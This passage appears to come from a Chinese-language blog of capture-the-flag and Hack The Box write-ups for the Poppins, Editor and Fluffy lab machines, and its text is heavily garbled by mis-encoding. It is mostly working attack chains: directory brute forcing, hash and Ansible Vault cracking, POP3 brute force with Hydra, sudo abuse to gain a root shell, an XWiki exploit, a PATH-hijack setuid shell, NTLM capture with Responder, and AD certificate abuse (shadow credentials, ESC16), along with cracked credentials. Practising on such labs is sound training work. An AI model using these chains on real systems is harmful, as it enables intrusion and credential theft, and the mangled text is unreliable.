http://172.20.10.2 -w /root/zidianjiheinkali/dir/directory-list-2.3-medium.txtxxxxxçœç•¥ä¸‹---- Entering directory: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/ ----== DIRECTORY: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/ ---- Entering directory: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/ ----== DIRECTORY: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ ---- Entering directory: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ ----+ http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/index.html è®¿é—®indexå‘ç°æç¤ºæ³¨æ„å¤‡ä»½æˆ‘ä»¬å°±æ‰«ææ–‡ä»¶åç¼€å°±è¡Œ gobuster dir -u http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,bak,backup,old,~===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) Christian Mehlmauer (@firefart)===============================================================[+] Url: http://172.20.10.2/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: bak,backup,old,~,html[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.html (Status: 403) [Size: 276]/index.html (Status: 200) [Size: 1531]/hash.bak (Status: 200) [Size: 3300]/.html (Status: 403) [Size: 276]Progress: 1323360 / 1323366 (100.00%)å‘ç°ä¸€ä¸ªhash.bak æ¯è¡Œ32ä½ç»“æœæ˜¯md5ç”¨johnæ¥ç ´è§£xxxxxx36038680b0a4dd318339c7d6f14e27d79128262fabd151136a4f5173c9f8b687a16529ed27831262cbfb879bdb372813c3c016a1ded2e9139566365156ac0e102118c709cb65868d19cc0eb70a1fd6031a4d5a0bd8e7ae4c52b75116e261ff532ce6a8451b97c9fbf126feaabc020cfedf5f5384aad29a7fd6530a00007c232118e117c28e23c72258ed6b586c64d79axxx ç”¨johnæ¥ç ´è§£è¦æŒ‡å®šæ˜¯Md5 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 100 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])Warning: no OpenMP support for this hash type, consider --fork=2Press q or Ctrl-C to abort, almost any other key for statuskent12 (?) amotejoel (?) sunjoo (?) iydgmvin (?) elised (?) 530223 (?) viking35 (?) naughtycat (?) shadow626 (?) middelweg (?) eloscar (?) cash1407 (?) carlosmoya (?) xytyx1972 (?) vanity17 (?) v0nowns. (?) teadorohector (?) taroh527 (?) susancliford (?) suicida*02 (?) snoopymai12277++ (?) xxxxxxx æ¸…ç†å‡ºå…¶ä»–ç¬¦å·æ”¾åˆ°æ–‡ä»¶é‡Œé¢æ¥çˆ†ç ´é‚®ä»¶ç«¯å£ å› ä¸ºSSHçˆ†ç ´ä¸äº†åªèƒ½å¯†é’¥ç™»å½•-æ”¶é›†ä¸‹ä¸»é¡µè¿™äº›ç”¨æˆ·å çˆ†ç ´POP hydra -L user.txt -P password.txt pop3://172.20.10.2:110 -V -I -f -u -t 64 -e nsrxxxxx[110][pop3] host: 172.20.10.2 login: Bert password: jmac92777 ç™»å½•ä¸Šå» telnetç™»å½•popæŸ¥çœ‹é‚®ä»¶ â”€â”€(rootã‰¿kali)-[~] USER ç”¨æˆ·å PASS å¯†ç  LIST æŸ¥çœ‹å…¨éƒ¨é‚®ä»¶ RETR æ•°å­— é€‰ä¸­æŸ¥çœ‹â””â”€# telnet 172.20.10.2 110Trying 172.20.10.2...Connected to 172.20.10.2.Escape character is ^].+OK Dovecot (Debian) readyUSER Bert+OKPASS jmac92777+OK Logged in.LIST+OK 1 messages:1 1517.RETR 1+OK 1517 octetsReturn-path: jane@poppinsEnvelope-to: bert@poppinsDelivery-date: Fri, 29 Aug 2025 06:33:49 -0400Received: from jane by Poppins with local (Exim 4.94.2) (envelope-from jane@poppins) id 1urwQW-0001RQ-CD for bert@poppins; Fri, 29 Aug 2025 06:33:48 -0400To: bert@poppinsSubject: Urgent: Prod Server Credentials for Ansible PlaybookMIME-Version: 1.0Content-Type: text/plain; charset=UTF-8Content-Transfer-Encoding: 8bitMessage-Id: E1urwQW-0001RQ-CD@PoppinsFrom: jane@poppinsDate: Fri, 29 Aug 2025 06:33:48 -0400Hi Bert,Ive just finished the new Ansible playbook for the a-27 software deployment on our main production server, `web01.poppins.dsz`. Its ready to go.The playbook contains some sensitive API keys, so Ive encrypted the variables using Ansible Vault. Youll need to use the `ansible-vault decrypt` command to run it.Here is the vault string youll need to paste into the `secrets.yml` file.```$ANSIBLE_VAULT;1.1;AES2563236333934663930343263363831353138323630393134320a3663663939393736363865383363366335363366376634630a326563623737626337353436323565643365333061663661396337613731```Let me know if you hit any issues. We need to get this deployed by EOD.Thanks,Jane è§£å¯†ANSIBLEå¯†é’¥å‘ç°ä¸€ä¸ªANSIBLEå¯†é’¥ ä½¿ç”¨ansible2john.py ä¼ ä¸ºHASHæ¥ç ´è§£ JohnTheRipperrunansible2john.py at bleeding-jumbo Â· big-mainJohnTheRipper python3 ansible2john.py secert.yml secert.yml:$ansible$0*0*fbf1ccb032c287388f4744de2ee4220398031f6026394f9042c6815182609142*2ecb77bc754625ed3e30af6a9c7a7170*6cf9997668e83c64556ef717b282d39c24ef52a7c490707358e60d6c563f7f4cjohn --wordlist=/usr/share/wordlists/rockyou.txt secert.ymlsecert.yml:javiel å¯†ç ä¸ºjaviel ç„¶åä½¿ç”¨ ä½¿ç”¨ ansible-vaultè§£å¯† å¾—åˆ°å¯†ç cumibug è¿™ä¸ªå·¥å…·å¯¹pythonç¯å¢ƒæœ‰è¦æ±‚å¯ä»¥å¼€å¯ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒ æ¿€æ´»ç¯å¢ƒpython3.12 -m venv ansible-env/root/ansible-env/bin/activateé€€å‡ºdeactivateâ””â”€# ansible-vault decrypt secert.yml Vault password: Decryption successful â”Œâ”€â”€(ansible-env)â”€(rootã‰¿kali)-[~/ansible-env]â””â”€# cat secert.yml cumibug â”Œâ”€â”€(ansibl è¿™æ—¶å€™å¡äº†ä¸çŸ¥é“å¹²å˜›çš„ å‰é¢è¿˜å¾—åˆ°äº†ä¸€ä¸ªç”¨æˆ·å› ä¸ºå…¶ä»–ç”¨æˆ·ä»–ä¸è¯†åˆ«ä½ çš„å¯†ç ï¼Œä½†æ˜¯è¿™ä¸ªç”¨æˆ·ä»–è¯†åˆ« ææƒä¸»è¦ç”¨æˆ·ssh jane@172.20.10.2 å¯†ç javiel è¿™ä¸ªç”¨æˆ·sudo -læ²¡æœ‰ -su michael å¯†ç å°±æ˜¯ cumibug sudo -l æœ‰ (winifred) PASSWD: /usr/bin/mail * è¾“å…¥è‡ªå·±çš„å¯†ç å°±å¯ä»¥æ‰§è¡Œè¿™ä¸ªä¸æ˜¯éœ€è¦è¿™ä¸ªç”¨æˆ·å¯†ç ææƒï¼šåˆ°winifredç”¨æˆ·sudo -u winifred /usr/bin/mail -f /etc/passwdmichael@Poppins:~$ sudo -u winifred /usr/bin/mail -f /etc/passwdMail version 8.1.2 01/15/2001. Type ? for help./etc/passwd: 0 messages [Read only] whoamiUnknown command: whoami !/bin/bashwinifred@Poppins:/home/michael$ whoamiwinifredwinifred@Poppins:/home/michael$ sudo -lMatching Defaults entries for winifred on Poppins: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser winifred may run the following commands on Poppins: (ALL) NOPASSWD: /usr/bin/ansible *winifred@Poppins:/home/michael$ pwd ææƒæ ¹ç”¨æˆ·å®ƒå¯ä»¥ç”¨ansible ansible æ˜¯è¿ç»´çš„è½¯ä»¶ sudo usrbinansible localhost -c local -m command -a â€œchmod +s binbashâ€ æ‰§è¡Œå‘½ä»¤ winifred@Poppins:~$ sudo /usr/bin/ansible localhost -c local -m command -a chmod +s /bin/bash[WARNING]: No inventory was parsed, only implicit localhost is available[WARNING]: Consider using the file module with mode rather than running chmod. If you need to use commanbecause file is insufficient you can add warn: false to this command task or set command_warnings=Falsein ansible.cfg to get rid of this message.localhost | CHANGED | rc=0 winifred@Poppins:~$ ls -al /bin/bash-rwsr-sr-x 1 root root 1168776 Apr 18 2019 /bin/bashwinifred@Poppins:~$ /bin/bash -pbash-5.0# whoamirootbash-5.0# cat /root/root.txt learning1.å¤‡ä»½æ–‡ä»¶åç¼€ html,bak,backup,old,~ 2.ansible2john.py johnç ´è§£å¯†ç  3.æŒ‡å®šmd5ç ´è§£ john --format=raw-md5 â€“wordlistusrsharewordlistsrockyou.txt hash 4.æ¸—é€ä¸­çš„ç”¨æˆ·åæ”¶é›† å¯†ç æ”¶é›†","tags":["linux"]},{"title":"Editor-htb","path":"/2025/09/02/posts/editor-htb/","content":"Editor-htb ç«¯å£æ‰«æ8080è¿›å»â”Œâ”€â”€(rootã‰¿kali)-[~]â””â”€# nmap 10.10.11.80Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-02 12:19 CSTNmap scan report for editor.htb (10.10.11.80)Host is up (1.3s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE22tcp open ssh80tcp open http8080tcp open http-proxy å‘ç°æ˜¯ä¸€å…±XWIKIç”¨POCæ‰“ hackersonsteroidscve-2025-24893: Modified exploit for CVE-2025-24893 æ‹¿åˆ°shell find /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name *config* -o -name *.properties -o -name *.xml 2/dev/nullæŸ¥è¯¢æ•°æ®åº“æ–‡ä»¶$ find /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name *config* -o -name *.properties -o -name *.xml 2/dev/null/var/lib/xwiki/data/configuration.properties/var/lib/xwiki/data/store/file/xwiki/b/f/8fb536bfe96480556241885cb20974/attachments/e/6/d4cbb35779b27121c39efde2a23520/~METADATA.xml/var/lib/xwiki/data/store/solr/events_9/conf/solrconfig.xml/var/lib/xwiki/data/store/solr/events_9/core.properties/var/lib/xwiki/data/store/solr/extension_index_9/conf/solrconfig.xml/var/lib/xwiki/data/store/solr/extension_index_9/core.properties/var/lib/xwiki/data/store/solr/solr.xml/var/lib/xwiki/data/store/solr/events/conf/solrconfig.xml/var/lib/xwiki/data/store/solr/events/core.properties/var/lib/xwiki/data/store/solr/search/META-INF/maven/org.xwiki.platform/xwiki-platform-search-solr-server-core/pom.xml/var/lib/xwiki/data/store/solr/search/META-INF/maven/org.xwiki.platform/xwiki-platform-search-solr-server-core/pom.properties/var/lib/xwiki/data/store/solr/search/conf/elevate.xml/var/lib/xwiki/data/store/solr/search/conf/currency.xml/var/lib/xwiki/data/store/solr/search/conf/solrconfig.xml/var/lib/xwiki/data/store/solr/search/core.properties/var/lib/xwiki/data/store/solr/search_9/conf/managed-schema.xml/var/lib/xwiki/data/store/solr/search_9/conf/solrconfig.xml/var/lib/xwiki/data/store/solr/search_9/core.properties/var/lib/xwiki/data/store/solr/extension_index/conf/solrconfig.xml/var/lib/xwiki/data/store/solr/extension_index/core.properties/var/lib/xwiki/data/extension/history/2025.06.13.xml/var/lib/xwiki/data/jobs/status/store.properties/var/lib/xwiki/data/jobs/status/3/distribution/log.xml/var/lib/xwiki/data/jobs/status/3/solr/indexer/log.xml/var/lib/xwiki/data/jobs/status/extension/index/log.xml/var/lib/xwiki/data/jobs/status/solr/indexer/log.xml/var/lib/xwiki/tmp/start_1826614924204897555.properties/etc/xwiki/portlet.xml/etc/xwiki/jetty-web.xml/etc/xwiki/jetty-ee8-web.xml/etc/xwiki/cache/infinispan/config.xml/etc/xwiki/hibernate.cfg.xml/etc/xwiki/xwiki.properties/etc/xwiki/sun-web.xml/etc/xwiki/web.xml/etc/xwiki/jboss-deployment-structure.xml/etc/xwiki/xwiki-tomcat9.xml/etc/xwiki/version.properties/etc/xwiki/logback.xml é—®äº†ä¸‹AI æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶ $ cat etcxwikihibernate.cfg.xml property name=hibernate.connection.usernamexwiki/property property name=hibernate.connection.passwordtheEd1t0rTeam99/property property name=hibernate.connection.driver_classcom.mysql.cj.jdbc.Driver/property property name=hibernate.dbcp.poolPreparedStatementstrue/property property name=hibernate.dbcp.maxOpenPreparedStatements20/property æ‹¿åˆ°äº†æ•°æ®åº“è´¦å·å¯†ç  æŸ¥çœ‹passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:104::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinpollinate:x:105:1::/var/cache/pollinate:/bin/falsesshd:x:106:65534::/run/sshd:/usr/sbin/nologinsyslog:x:107:113::/home/syslog:/usr/sbin/nologinuuidd:x:108:114::/run/uuidd:/usr/sbin/nologintcpdump:x:109:115::/nonexistent:/usr/sbin/nologintss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/falselandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologinfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinusbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/falsednsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinmysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/falsetomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologinxwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologinnetdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologinoliver:x:1000:1000:,,,:/home/oliver:/bin/bash_laurel:x:995:995::/var/log/laurel:/bin/falseå‘ç°ç”¨æˆ·oliver è¿™é‡Œæ•°æ®åº“å¯†ç å¯ä»¥ç™»å½• å‘ç°ä¸€ä¸ªsuidç¨‹åºndsudo è¿™é‡Œä½ æ‰§è¡Œnvme-list ä»–ä¼šæ‰§è¡Œ nvmeç¨‹åº æ‰€ä»¥æˆ‘ä»¬ç”¨å˜é‡åŠ«æŒ #include unistd.hint main() setuid(0); setgid(0); execl(/bin/bash, bash, NULL); return 0;ç¼–è¯‘åä¼ ä¸Šå»scp nvme oliver@10.10.11.80:/tmpoliver@10.10.11.80s password: nvme export PATHtmp:$PATH æˆåŠŸææƒ learningXwiki POC https://github.com/hackersonsteroids/cve-2025-24893find /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name *config* -o -name *.properties -o -name *.xml 2/dev/null æœç´¢MySQL/MariaDB /etc/mysql/my.cnf æˆ– /etc/my.cnf å…³é”®é…ç½®æ–‡ä»¶/etc/xwiki/hibernate.cfg.xml XWiki ä¼ä¸š wiki å¹³å°æ ¸å¿ƒæ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œexport PATH=/tmp:$PATH è¿½åŠ `/tmp`åˆ° PATH æœ€å‰ï¼Œä¿ç•™åŸæœ‰è·¯å¾„","tags":["Xwiki"]},{"title":"fluffy-htb","path":"/2025/09/02/posts/fluffy-htb-w/","content":"fluffy-htb ç»™äº†ä¸€ä¸ªè´¦å· j.fleischman J0elTHEM4n1990! Nmapæ‰«æ æ·»åŠ åˆ°hostsé‡Œ10.10.11.69 DC01.fluffy.htb fluffy.htb æ·»åŠ hosts ç™»å½• SMB æœåŠ¡åï¼Œå·¥å…·ä¼šè‡ªåŠ¨å°è¯•ä» RID 1000 å¼€å§‹é€’å¢æšä¸¾ï¼ˆé€šå¸¸åŸŸç”¨æˆ· RID ä» 1000 èµ·ï¼‰ï¼Œå‘åŸŸæ§å‘é€æŸ¥è¯¢è¯·æ±‚ï¼Œè·å–æ¯ä¸ª RID å¯¹åº”çš„ ç”¨æˆ·åã€ç»„åæˆ–è®¡ç®—æœºåã€‚crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990 --shares æšä¸¾smbå…±äº«ç›®å½•ä¿¡æ¯ é€‰ä¸­SidtypeUserç»„ ä»¥\\åˆ†å‰² é€‰ä¸­ç¬¬äºŒéƒ¨åˆ† ä¸é€‰æ‹©ç©ºæ ¼ æ”¾åˆ°users.txtä¸­ crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! â€“rid-brute | grep â€œSidTypeUserâ€ | awk -F â€˜\\â€˜ â€˜{print $2}â€™ | awk â€˜{print $1}â€™ users.txt è¯•ä¸€ä¸‹å¯†ç å–·å°„å‘ç°ä¸è¡Œ è¿›å…¥SMBç›®å½•å¯»æ‰¾è®¯æ¯è¿™é‡Œæœ‰ä¸€ä¸ªPDF æˆ‘ä»¬æ‰“å¼€æç¤ºäº† CVEä¿¡æ¯CVE-2025-24071_PoC-main https://github.com/0x6rss/CVE-2025-24071_PoC/ python poc.pyâ””â”€# python poc.pyEnter your file name: expEnter IP (EX: 192.168.1.162): 10.10.16.9completed æ”¾å…¥ç”Ÿæˆçš„æ–‡ä»¶ drw-rw-rw- 0 Tue Sep 2 21:39:52 2025 . drw-rw-rw- 0 Tue Sep 2 21:39:52 2025 .. drw-rw-rw- 0 Fri May 16 22:51:49 2025 Everything-1.4.1.1026.x64 -rw-rw-rw- 1827464 Fri May 16 22:51:49 2025 Everything-1.4.1.1026.x64.zip drw-rw-rw- 0 Fri May 16 22:51:49 2025 KeePass-2.58 -rw-rw-rw- 3225346 Fri May 16 22:51:49 2025 KeePass-2.58.zip -rw-rw-rw- 169963 Sat May 17 22:31:07 2025 Upgrade_Notice.pdf put exploit.zip æ”¾å…¥æ–‡ä»¶ ç„¶åç›‘å¬ responder -I tun0 -wvF æˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªè´¦å·å¯†ç  ç”¨johnç ´è§£ä¸‹prometheusx-303 (p.agila) ä½¿ç”¨bloodhoundæ¥åˆ†æåŸŸç¯å¢ƒbloodhound-python -u j.fleischman -p J0elTHEM4n1990! -k -d fluffy.htb â€“zip -c All -dc dc01.fluffy.htb -ns 10.10.11.69 â€“dns-tcp é€šè¿‡ä¸Šé¢ä¸¤ä¸ªå›¾å¯ä»¥å¾—å‡º P.AGILAå±äºSERVICEç®¡ç†ç»„ è¿™ä¸ªç»„å¯¹service accountæœ‰å…¨éƒ¨é€šç”¨æƒé™è¿™ä¸ªserviceaccount å¯ä»¥ç®¡ç†ä¸‰ä¸ªç”¨æˆ· SERVICE ACCOUNTS å¯¹ ca_svcã€ldap_svcã€winrm_svc ç­‰è´¦æˆ·æœ‰ GenericWrite æƒé™ï¼Œ è¿™æ„å‘³ç€å¯ä»¥å‘è¿™äº›è´¦æˆ·æ·»åŠ è‡ªå®šä¹‰ KeyCredentia å½±å­æ”»å‡»è¿™é‡Œæç¤ºä»€ä¹ˆæ—¶é—´å°±ntpdataåŒæ­¥ä¸‹å’ŒDCçš„æ—¶é—´ æç¤ºæƒé™å°±é‡æ–°æ‰§è¡ŒåŠ å…¥ç»„å‘½ä»¤ https://github.com/CravateRouge/BloodyAD å…ˆæ·»åŠ ç”¨æˆ·åˆ°è¯¥ç»„è·å¾—æ‰§è¡Œé‚£ä¸‰ä¸ªç³»ç»Ÿç”¨æˆ·æƒé™-å¦‚æœåé¢æç¤ºæ‹’ç»å°±é‡æ–°è¿è¡Œä¸‹è¿™ä¸ªå‘½ä»¤å‘½ä»¤æˆåŠŸè¿è¡Œåï¼Œp.agila ç”¨æˆ·ä¼šè¢«æ·»åŠ åˆ° SERVICE ACCOUNTS ç»„ä¸­ï¼Œæˆä¸ºè¯¥ç»„çš„æˆå‘˜ã€‚ â””â”€# bloodyAD -d fluffy.htb -u p.agila -p â€˜prometheusx-303â€™ â€“dc-ip 10.10.11.69 add groupMember â€˜SERVICE ACCOUNTSâ€™ p.agila [+] p.agila added to SERVICE ACCOUNTS æˆåŠŸæ·»åŠ  è·å¾—winrmç”¨æˆ·çš„hash certipy-ad shadow auto -u â€˜p.agila@fluffy.htbâ€˜ -p â€˜prometheusx-303â€™ -account â€˜winrm_svcâ€™ -target dc01.fluffy.htb -dc-ip 10.10.11.69 ä½¿ç”¨evilç™»å½•è·å¾—user.flag è·å–ca_svcç”¨æˆ· NTLM hashcertipy-ad shadow auto -u â€˜p.agila@fluffy.htbâ€˜ -p â€˜prometheusx-303â€™ -account â€˜ca_svcâ€™ -target dc01.fluffy.htb -dc-ip 10.10.11.69 æ‰§è¡Œä¸‹é¢å¯»æ‰¾æœ‰æ— æ¼æ´å‘½ä»¤æç¤ºä¸å­˜åœ¨æ¨¡æ¿éœ€è¦æ›´æ–°ä¸‹éœ€è¦æ›´æ–°ç‰ˆæœ¬ certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable ly4kCertipy: Tool for Active Directory Certificate Services enumeration and abuse è¿›å»åpip install . éœ€è¦pythonç‰ˆæœ¬12 å¦‚æœpythonç‰ˆæœ¬ä¸åŒ¹é…è¿˜è¦ä¸‹è½½python 3.12.0.4 source certipy-3.12-envbinactivate æ¿€æ´»pipè™šæ‹Ÿç¯å¢ƒ certipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable å‘ç°æ¼æ´ESC16 ESC16certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -user ca_svc readå°†å—å®³è€…è´¦æˆ·çš„ UPN æ›´æ–°ä¸ºç›®æ ‡ç®¡ç†å‘˜çš„ sAMAccountNameã€‚certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -upn administrator -user ca_svc updateä»¥ p.agila èº«ä»½ä¸º ca_svc è´¦æˆ·æ·»åŠ å½±å­å‡­æ®ï¼ˆä¿®æ”¹ msDS-KeyCredentialLink å±æ€§ï¼‰ï¼Œå¹¶è‡ªåŠ¨å®Œæˆè¯ä¹¦ç”³è¯·ä¸è®¤è¯ï¼Œæœ€ç»ˆè·å– ca_svc çš„ NT å“ˆå¸Œæˆ–ç¥¨æ®ã€‚certipy shadow -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -account ca_svc autoexport KRB5CCNAME=ca_svc.ccache certipy req -k -dc-ip 10.10.11.69 -target DC01.FLUFFY.HTB -ca fluffy-DC01-CA -template Userè¿˜åŸâ€œå—å®³è€…â€å¸æˆ·çš„ UPNã€‚certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -upn ca_svc@fluffy.htb -user ca_svc updateä»¥ç›®æ ‡ç®¡ç†å‘˜èº«ä»½è¿›è¡Œèº«ä»½éªŒè¯ã€‚certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain fluffy.htb 1ï¼šéªŒè¯ p.agila æ˜¯å¦å¯¹ ca_svc æœ‰åŸºæœ¬çš„è¯»å–æƒé™ï¼ˆä¸ºåç»­ä¿®æ”¹æ“ä½œé“ºè·¯ï¼‰ï¼› certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -user ca_svc readCertipy v5.0.3 - by Oliver Lyak (ly4k)[*] Reading attributes for ca_svc: cn : certificate authority service distinguishedName : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb name : certificate authority service objectSid : S-1-5-21-497550768-2797716248-2627064577-1103 sAMAccountName : ca_svc servicePrincipalName : ADCS/ca.fluffy.htb userPrincipalName : ca_svc@fluffy.htb userAccountControl : 66048 whenCreated : 2025-04-17T16:07:50+00:00 whenChanged : 2025-09-02T15:31:47+00:00 2ï¼šå°† ca_svc çš„ UPN ä¸´æ—¶ä¿®æ”¹ä¸º administrator UPNï¼ˆç”¨æˆ·ä¸»ä½“åç§°ï¼‰ æ˜¯åŸŸç”¨æˆ·çš„å”¯ä¸€æ ‡è¯†ï¼ˆæ ¼å¼ï¼šç”¨æˆ·å@åŸŸåï¼‰ï¼Œä¿®æ”¹ä¸º administrator åï¼Œca_svc åœ¨è¯ä¹¦ç”³è¯·æ—¶ä¼šè¢«è¯†åˆ«ä¸º administratorï¼› å®é™…å®Œæ•´æ ¼å¼æ˜¯ administrator@fluffy.htbï¼‰ï¼Œæ˜¯ä¸ºäº†æ¬ºéª—è¯ä¹¦æœåŠ¡å™¨ï¼ˆCAï¼‰ï¼š CA åœ¨éªŒè¯è¯ä¹¦ç”³è¯·æ—¶ï¼Œä¼šæ£€æŸ¥ç”³è¯·è€…çš„ UPN æ˜¯å¦ç¬¦åˆæ¨¡æ¿æƒé™ã€‚ä¿®æ”¹åï¼ŒCA ä¼šè¯¯è®¤ä¸ºæ˜¯ administrator æœ¬äººåœ¨ç”³è¯·è¯ä¹¦ï¼Œä»è€Œé¢å‘é«˜æƒé™è¯ä¹¦ï¼Œå®ç° â€œä¼ªè£…èº«ä»½â€ çš„ç›®çš„ã€‚ certipy account -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -upn administrator -user ca_svc updateCertipy v5.0.3 - by Oliver Lyak (ly4k)[*] Updating user ca_svc: userPrincipalName : administrator[*] Successfully updated ca_svc 3ï¼šä¸º ca_svc æ·»åŠ å½±å­å‡­æ®ï¼Œè·å–è®¤è¯ææ–™ å½±å­å‡­æ®ï¼šé€šè¿‡ä¿®æ”¹ ca_svc çš„ msDS-KeyCredentialLink å±æ€§ï¼Œæ·»åŠ ä¸€ä¸ªæ–°çš„å¯†é’¥å¯¹ï¼Œæœ¬è´¨æ˜¯ä¸º ca_svc æ³¨å…¥ä¸€ä¸ªå¯æ§çš„ â€œè™šæ‹Ÿå¯†ç â€ ç”Ÿæˆä¸€ä¸ªå¯†é’¥æ–‡ä»¶ certipy shadow -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -account ca_svc autoCertipy v5.0.3 - by Oliver Lyak (ly4k)[*] Targeting user ca_svc[*] Generating certificate[*] Certificate generated[*] Generating Key Credential[*] Key Credential generated with DeviceID 7ce9744427f5487f82ef4285adb01852[*] Adding Key Credential with device ID 7ce9744427f5487f82ef4285adb01852 to the Key Credentials for ca_svc[*] Successfully added Key Credential with device ID 7ce9744427f5487f82ef4285adb01852 to the Key Credentials for ca_svc[*] Authenticating as ca_svc with the certificate[*] Certificate identities:[*] No identities found in this certificate[*] Using principal: ca_svc@fluffy.htb[*] Trying to get TGT...[*] Got TGT[*] Saving credential cache to ca_svc.ccache[*] Wrote credential cache to ca_svc.ccache[*] Trying to retrieve NT hash for ca_svc[*] Restoring the old Key Credentials for ca_svc[*] Successfully restored the old Key Credentials for ca_svc[*] NT hash for ca_svc: ca0f4f9e9eb8a092addf53bb03fc98c8export KRB5CCNAME=ca_svc.ccache æŒ‡å®šæ–‡ä»¶ 4ï¼šä»¥ ca_svc èº«ä»½ï¼ˆä¼ªè£…æˆ administratorï¼‰ç”³è¯·è¯ä¹¦ -k è¡¨ç¤ºä½¿ç”¨ Kerberos ç¥¨æ®ï¼ˆå³ ca_svc.ccacheï¼‰è®¤è¯ï¼› å‘ fluffy-DC01-CA è¯ä¹¦æœåŠ¡å™¨ç”³è¯· User æ¨¡æ¿è¯ä¹¦ï¼šç”±äº ca_svc çš„ UPN å·²æ”¹ä¸º administratorï¼ŒCA ä¼šè¯¯è®¤ä¸ºæ˜¯ administrator ç”³è¯·è¯ä¹¦ï¼Œæœ€ç»ˆé¢å‘åŒ…å« administrator èº«ä»½çš„è¯ä¹¦ï¼ˆå¦‚ administrator.pfxï¼‰ï¼› User 